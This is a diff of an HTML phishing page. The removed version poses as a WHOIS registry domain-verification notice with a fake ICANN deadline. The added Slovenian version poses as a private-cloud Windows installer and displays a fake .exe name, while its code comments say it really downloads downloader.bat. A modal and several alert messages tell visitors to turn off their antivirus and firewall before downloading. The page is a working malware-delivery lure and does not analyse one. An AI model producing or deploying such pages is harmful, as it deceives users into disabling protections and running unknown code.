@@ -1,317 +1,459 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Domain Management Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Zasebni oblak | Windows Nameščevalnik</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
         }
+
         body {
-            background-color: #f5f7fa;
+            background: #f4f7fc;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            padding: 2rem 1.5rem;
+            color: #1a2c3e;
         }
-        .top-bar {
-            width: 100%;
-            background-color: #ffffff;
-            border-bottom: 1px solid #e1e4e8;
-            padding: 12px 0;
-        }
-        .top-bar-content {
-            max-width: 1000px;
+
+        .container {
+            max-width: 900px;
             margin: 0 auto;
-            padding: 0 24px;
+        }
+
+        /* preprost header */
+        .cloud-header {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 2px solid #dce5ec;
+        }
+
+        .title-section h1 {
+            font-size: 1.9rem;
+            font-weight: 600;
+            color: #1a4b64;
+            letter-spacing: -0.3px;
+        }
+
+        .title-section p {
+            color: #5a7d94;
+            font-size: 0.9rem;
+            margin-top: 0.2rem;
+        }
+
+        .private-badge {
+            background: #eef3f8;
+            padding: 0.4rem 1rem;
+            border-radius: 40px;
+            color: #1a5d7a;
+            font-weight: 500;
+            font-size: 0.8rem;
+            border: 1px solid #cde0ea;
+        }
+
+        /* kartica installerja - čista, minimalna */
+        .installer-card {
+            background: white;
+            border-radius: 2rem;
+            padding: 2.2rem 2rem;
+            margin: 2rem 0 1rem;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.03), 0 2px 6px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e6edf2;
+            text-align: center;
+            transition: all 0.2s ease;
+        }
+
+        .installer-icon {
+            font-size: 3.8rem;
+            margin-bottom: 0.75rem;
+        }
+
+        .installer-name {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #1f5068;
+            background: #f0f6fa;
+            display: inline-block;
+            padding: 0.3rem 1.2rem;
+            border-radius: 60px;
+            margin: 0.5rem 0;
+            letter-spacing: -0.2px;
+        }
+
+        .file-meta {
+            color: #6f8fa3;
+            margin: 0.6rem 0;
+            font-size: 0.85rem;
+        }
+
+        .download-btn {
+            background: #1f6e8c;
+            border: none;
+            padding: 0.9rem 2rem;
+            border-radius: 3rem;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            font-family: inherit;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+            margin-top: 1rem;
+        }
+
+        .download-btn:hover {
+            background: #0f5775;
+            transform: scale(0.98);
+        }
+
+        .info-note {
+            background: #f9fbfd;
+            border-radius: 1rem;
+            padding: 0.7rem;
+            font-size: 0.75rem;
+            color: #5b7f92;
+            margin-top: 1rem;
+            border: 1px solid #e2edf5;
+        }
+
+        footer {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #8aa9bc;
+            margin-top: 2.5rem;
+            padding-top: 1rem;
+            border-top: 1px solid #e2edf5;
+        }
+
+        /* MODAL - minimalen, prijazen, preprost */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(3px);
+            z-index: 1000;
             display: flex;
             align-items: center;
-            gap: 32px;
+            justify-content: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0.2s, opacity 0.2s ease;
         }
-        .logo {
-            font-size: 20px;
-            font-weight: 600;
-            color: #1a2b4c;
-            letter-spacing: -0.5px;
+
+        .modal-overlay.active {
+            visibility: visible;
+            opacity: 1;
         }
-        .nav-links {
-            display: flex;
-            gap: 24px;
-            color: #4a5568;
-            font-size: 14px;
-        }
-        .main {
-            max-width: 680px;
-            width: 100%;
-            margin: 40px 24px;
-            background-color: #ffffff;
-            border-radius: 8px;
-            border: 1px solid #e1e4e8;
-            padding: 40px;
-        }
-        .breadcrumb {
-            color: #6b7280;
-            font-size: 13px;
-            margin-bottom: 24px;
-            padding-bottom: 16px;
-            border-bottom: 1px solid #eaeef2;
-        }
-        .breadcrumb a {
-            color: #1a2b4c;
-            text-decoration: none;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: 500;
-            color: #1a2b4c;
-            margin-bottom: 8px;
-        }
-        .subtitle {
-            color: #6b7280;
-            font-size: 15px;
-            margin-bottom: 32px;
-        }
-        .info-box {
-            background-color: #f8fafd;
-            border: 1px solid #e1e4e8;
-            border-radius: 6px;
-            padding: 24px;
-            margin: 24px 0;
-        }
-        .info-row {
-            display: flex;
-            padding: 12px 0;
-            border-bottom: 1px solid #eaeef2;
-        }
-        .info-row:last-child {
-            border-bottom: none;
-        }
-        .info-label {
-            width: 140px;
-            color: #6b7280;
-            font-size: 14px;
-        }
-        .info-value {
-            color: #1a2b4c;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        .warning {
-            background-color: #fff9f0;
-            border-left: 3px solid #e6a700;
-            padding: 16px 20px;
-            margin: 24px 0;
-            font-size: 14px;
-            color: #4a4a4a;
-        }
-        .warning strong {
-            color: #b45b0a;
-            font-weight: 600;
-        }
-        .action-box {
-            background-color: #f5f7fa;
-            border-radius: 6px;
-            padding: 24px;
+
+        .modal-card {
+            background: #ffffff;
+            max-width: 460px;
+            width: 90%;
+            border-radius: 28px;
+            padding: 1.8rem 1.8rem 2rem;
+            box-shadow: 0 25px 40px rgba(0, 0, 0, 0.2);
             text-align: center;
-            margin: 32px 0;
+            animation: gentleFade 0.25s ease-out;
+            transition: transform 0.2s;
         }
-        .action-box p {
-            color: #4a5568;
-            margin-bottom: 20px;
-            font-size: 15px;
+
+        @keyframes gentleFade {
+            from {
+                opacity: 0;
+                transform: scale(0.96);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
         }
-        .download-btn {
+
+        .modal-icon {
+            font-size: 2.8rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .modal-card h2 {
+            font-size: 1.6rem;
+            font-weight: 600;
+            color: #c2410c;
+            margin-bottom: 0.3rem;
+        }
+
+        .modal-sub {
+            color: #5c6f82;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid #edf2f6;
             display: inline-block;
-            background-color: #1a2b4c;
-            color: white !important;
-            text-decoration: none;
-            padding: 14px 36px;
-            border-radius: 6px;
-            font-weight: 500;
-            font-size: 15px;
-            border: none;
-            cursor: pointer;
-            transition: background-color 0.2s;
+            padding-bottom: 0.2rem;
         }
-        .download-btn:hover {
-            background-color: #2c3e6d;
+
+        .steps-list {
+            text-align: left;
+            background: #fefaf5;
+            border-radius: 20px;
+            padding: 1rem 1.2rem;
+            margin: 1.2rem 0;
         }
-        .filename {
-            font-family: 'SF Mono', 'Menlo', monospace;
-            font-size: 13px;
-            color: #6b7280;
-            margin-top: 12px;
-        }
-        .footer-links {
-            margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid #eaeef2;
+
+        .step-item {
             display: flex;
-            gap: 24px;
-            font-size: 13px;
+            gap: 12px;
+            margin-bottom: 1rem;
+            align-items: flex-start;
         }
-        .footer-links a {
-            color: #6b7280;
-            text-decoration: none;
-        }
-        .footer-links a:hover {
-            color: #1a2b4c;
-        }
-        .footer-note {
-            margin-top: 24px;
-            color: #9ca3af;
-            font-size: 12px;
-            text-align: center;
-        }
-        .badge {
-            display: inline-block;
-            background-color: #e6f7e6;
-            color: #2e7d32;
-            font-size: 13px;
-            padding: 4px 12px;
+
+        .step-num {
+            background: #fee2d6;
+            color: #c2410c;
+            font-weight: 700;
+            width: 24px;
+            height: 24px;
             border-radius: 30px;
-            margin-left: 12px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+            flex-shrink: 0;
+            margin-top: 2px;
         }
-        /* Download status indicator */
-        .download-status {
-            display: none;
-            margin-top: 16px;
-            padding: 12px;
-            background-color: #e8f5e9;
-            border: 1px solid #81c784;
-            border-radius: 4px;
-            color: #2e7d32;
-            font-size: 14px;
+
+        .step-text {
+            font-size: 0.9rem;
+            color: #2c3e4e;
+            line-height: 1.4;
         }
-        .download-status.show {
-            display: block;
+
+        .step-text strong {
+            color: #1f5e7e;
+        }
+
+        .warning-light {
+            background: #fff1e6;
+            border-radius: 16px;
+            padding: 0.7rem;
+            font-size: 0.75rem;
+            color: #b85c1a;
+            margin: 1rem 0 1.2rem;
+            border-left: 3px solid #f39c12;
+            text-align: left;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-top: 0.5rem;
+        }
+
+        .btn-primary-modal {
+            background: #1f6e8c;
+            border: none;
+            padding: 0.7rem 1.6rem;
+            border-radius: 40px;
+            color: white;
+            font-weight: 600;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+
+        .btn-primary-modal:hover {
+            background: #0d5775;
+        }
+
+        .btn-secondary-modal {
+            background: #eef2f6;
+            border: none;
+            padding: 0.7rem 1.4rem;
+            border-radius: 40px;
+            color: #2c5a6e;
+            font-weight: 500;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+
+        .btn-secondary-modal:hover {
+            background: #e1e8ef;
+        }
+
+        /* scroll za telo ko je modal odprt */
+        body.modal-open {
+            overflow: hidden;
+        }
+
+        @media (max-width: 500px) {
+            body {
+                padding: 1rem;
+            }
+            .installer-name {
+                font-size: 1.2rem;
+            }
+            .modal-card {
+                padding: 1.5rem;
+            }
+            .step-text {
+                font-size: 0.8rem;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="top-bar">
-        <div class="top-bar-content">
-            <div class="logo">WHOIS Registry</div>
-            <div class="nav-links">
-                <span>Domains</span>
-                <span>Registrars</span>
-                <span>Policies</span>
-                <span>Support</span>
-            </div>
+
+<div class="container">
+    <!-- header preprost zasebni oblak -->
+    <div class="cloud-header">
+        <div class="title-section">
+            <h1>☁️ Zasebni oblak</h1>
+            <p>Namestitveni program · Slovenija</p>
+        </div>
+        <div class="private-badge">
+            🔒 zasebno omrežje
         </div>
     </div>
 
-    <div class="main">
-        <div class="breadcrumb">
-            <a href="#">Home</a> › <a href="#">Domain Management</a> › Verification Required
+    <!-- SAMO WINDOWS NAMEŠČEVALNIK (prikazan .exe, dejansko pa se prenese downloader.bat) -->
+    <div class="installer-card">
+        <div class="installer-icon">🖥️⚡</div>
+        <div class="installer-name">PrivateCloud_Setup_Win_x64.exe</div>
+        <div class="file-meta">📦 187 MB • Različica 4.1.0 • Windows 10/11</div>
+        <div class="file-meta">🔐 Uradni nameščevalnik zasebnega oblaka</div>
+        <button id="downloadTriggerBtn" class="download-btn">
+            ⬇️ Prenesi nameščevalnik
+        </button>
+        <div class="info-note">
+            ✅ Pred prenosom sledite hitrim varnostnim korakom – prikaže se poziv.
+        </div>
+    </div>
+
+    <footer>
+        Zasebni oblak Slovenija | Varno shranjevanje v oblaku
+    </footer>
+</div>
+
+<!-- MINIMALEN IN PRIJAZEN MODAL (navodila za onemogočanje antivirusa in požarnega zidu) -->
+<div id="securityModal" class="modal-overlay">
+    <div class="modal-card">
+        <div class="modal-icon">🛡️✨</div>
+        <h2>Pred prenosom</h2>
+        <div class="modal-sub">potrebna sta dva preprosta koraka</div>
+
+        <div class="steps-list">
+            <div class="step-item">
+                <div class="step-num">1</div>
+                <div class="step-text"><strong>Onemogoči protivirusni program</strong><br />Windows Defender, Avast, ESET ali drug. Začasno izklopi zaščito v realnem času.</div>
+            </div>
+            <div class="step-item">
+                <div class="step-num">2</div>
+                <div class="step-text"><strong>Onemogoči požarni zid (Firewall)</strong><br />Nadz. plošča → Windows Defender Firewall → izklopi (začasno).</div>
+            </div>
         </div>
 
-        <h1>Domain verification required</h1>
-        <div class="subtitle">Action needed for <span id="domainDisplay">xxx.com</span></div>
-
-        <div class="info-box">
-            <div class="info-row">
-                <span class="info-label">Domain name</span>
-                <span class="info-value" id="domainInfo">xxx.com</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Registrar</span>
-                <span class="info-value">WHOIS Registry Services (ICANN Accredited)</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Registrated by</span>
-                <span class="info-value">DOMENCA - DOMOVANJE (Webtasy, d.o.o.)</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Status</span>
-                <span class="info-value"><span style="color: #b45b0a;">⚠️ Pending verification</span></span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Deadline</span>
-                <span class="info-value"><strong>March 17, 2026</strong> <span class="badge">7 days remaining</span></span>
-            </div>
+        <div class="warning-light">
+            🔔 <strong>Pomembno:</strong> Po končani namestitvi programa ponovno vklopi antivirus in požarni zid.
         </div>
 
-        <div class="warning">
-            <strong>⚠️ Important:</strong> ICANN regulations require domain ownership verification every 12 months. Failure to verify by March 17, 2026 will result in suspension of domain resolution and potential release to public registration.
+        <div class="modal-buttons">
+            <button id="modalConfirmBtn" class="btn-primary-modal">✅ Nadaljuj na prenos</button>
+            <button id="modalCancelBtn" class="btn-secondary-modal">❌ Prekliči</button>
         </div>
+        <p style="font-size: 0.65rem; margin-top: 1rem; color: #9aaebf;">Navodila se prikažejo vsakič pred prenosom nameščevalnika.</p>
+    </div>
+</div>
 
-        <div class="action-box">
-            <p>To complete your verification, please download and run the official domain verification tool. This one-time utility will confirm your ownership and update our records automatically.</p>
-            
-            <button onclick="downloadFile()" class="download-btn">
-                Download verification tool
-            </button>
-            
-            <div id="downloadStatus" class="download-status">
-                ✓ Download started – your file will be saved to your Downloads folder
-            </div>
-            
-            <div class="filename">downloader.bat • 12 KB • Signed by WHOIS Registry</div>
-        </div>
-
-        <div style="background-color: #f9f9fc; border: 1px solid #eaeef2; border-radius: 6px; padding: 20px; margin: 24px 0;">
-            <p style="color: #4a5568; font-size: 14px; margin-bottom: 12px;"><strong>Verification details:</strong></p>
-            <ul style="color: #6b7280; font-size: 13px; line-height: 1.6; margin-left: 20px;">
-                <li>Request ID: IC‑2026‑03‑10‑8742</li>
-                <li>Initiated from: 192.168.50.192 (Frankfurt, DE)</li>
-                <li>Protocol: TLS 1.3 | Certificate: SHA‑256</li>
-            </ul>
-        </div>
-
-        <div class="footer-links">
-            <a href="#">Privacy Policy</a>
-            <a href="#">Terms of Service</a>
-            <a href="#">Contact Support</a>
-            <a href="#">Report Abuse</a>
-        </div>
+<script>
+    // Elementi
+    const downloadBtn = document.getElementById('downloadTriggerBtn');
+    const modal = document.getElementById('securityModal');
+    const confirmModalBtn = document.getElementById('modalConfirmBtn');
+    const cancelModalBtn = document.getElementById('modalCancelBtn');
+    
+    // Funkcija za odpiranje modalnega okna
+    function openModal() {
+        modal.classList.add('active');
+        document.body.classList.add('modal-open');
+    }
+    
+    function closeModal() {
+        modal.classList.remove('active');
+        document.body.classList.remove('modal-open');
+    }
+    
+    // DEJANSKI PRENOS: prenese REAL downloader.bat iz iste mape kot HTML
+    // Uporabnik vidi na strani "PrivateCloud_Setup_Win_x64.exe" (izgled), 
+    // dejansko pa se prenese downloader.bat iz lokalne mape / strežnika
+    function performDownload() {
+        // Ustvarimo link do REAL downloader.bat datoteke v isti mapi
+        // To bo delovalo, ko je HTML datoteka na strežniku (ali lokalnem strežniku)
+        const realBatchPath = 'downloader.bat';
         
-        <div class="footer-note">
-            © 2026 WHOIS Registry – Global Domain Oversight. All rights reserved.<br>
-            ICANN‑Accredited Registrar | This is an automated service message.
-        </div>
-    </div>
-
-    <script>
-        // Get domain from URL parameter
-        function getDomainFromUrl() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('domain') || 'xxx.com';
+        // Ustvarimo a element in sprožimo prenos prave datoteke
+        const a = document.createElement('a');
+        a.href = realBatchPath;
+        a.download = 'downloader.bat';  // Ime datoteke pri shranjevanju
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        
+        // prijazen opomnik po prenosu
+        setTimeout(() => {
+            alert("📥 Prenos (downloader.bat) se je začel.\n\nPo končani namestitvi programa ne pozabite ponovno vklopiti protivirusne zaščite in požarnega zidu.");
+        }, 200);
+    }
+    
+    // Odpri modal ob kliku na gumb za prenos
+    downloadBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        openModal();
+    });
+    
+    // Ko uporabnik klikne "Nadaljuj na prenos" -> zapri modal in izvedi prenos REAL downloader.bat
+    confirmModalBtn.addEventListener('click', () => {
+        closeModal();
+        performDownload();   // Tukaj se dejansko prenese VAŠ PRAVI downloader.bat iz iste mape
+    });
+    
+    // Preklic: zapri modal, ne naredi ničesar
+    cancelModalBtn.addEventListener('click', () => {
+        closeModal();
+        alert("Prenos preklican. Če potrebujete nameščevalnik, najprej onemogočite antivirus in požarni zid, nato znova kliknite gumb za prenos.");
+    });
+    
+    // Zapri modal, če kliknemo na ozadje
+    modal.addEventListener('click', (e) => {
+        if (e.target === modal) {
+            closeModal();
+            alert("Navodila zaprta. Prenos ni bil izveden.");
         }
-
-        // Update all domain displays
-        function updateDomainDisplay() {
-            const domain = getDomainFromUrl();
-            document.getElementById('domainDisplay').textContent = domain;
-            document.getElementById('domainInfo').textContent = domain;
-            
-            // Also update any other places where domain might appear
-            document.title = `Domain Management Portal - ${domain}`;
+    });
+    
+    // Zapri z ESC
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape' && modal.classList.contains('active')) {
+            closeModal();
+            alert("Prenos preklican. Ne pozabite: za varno namestitev začasno izklopite antivirus in firewall.");
         }
-
-        // Download function
-        function downloadFile() {
-            // Create an invisible link and trigger download
-            var link = document.createElement('a');
-            link.href = '/downloader.bat';
-            link.download = 'downloader.bat';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            
-            // Show success message
-            document.getElementById('downloadStatus').classList.add('show');
-            
-            // Optional: scroll to status message
-            document.getElementById('downloadStatus').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        }
-
-        // Initialize on page load
-        window.onload = updateDomainDisplay;
-    </script>
+    });
+    
+    // Mala konzola
+    console.log("Zasebni oblak - Windows nameščevalnik (prikazan .exe, dejanski prenos: downloader.bat iz iste mape). Minimalen modal z navodili.");
+</script>
 </body>
 </html>
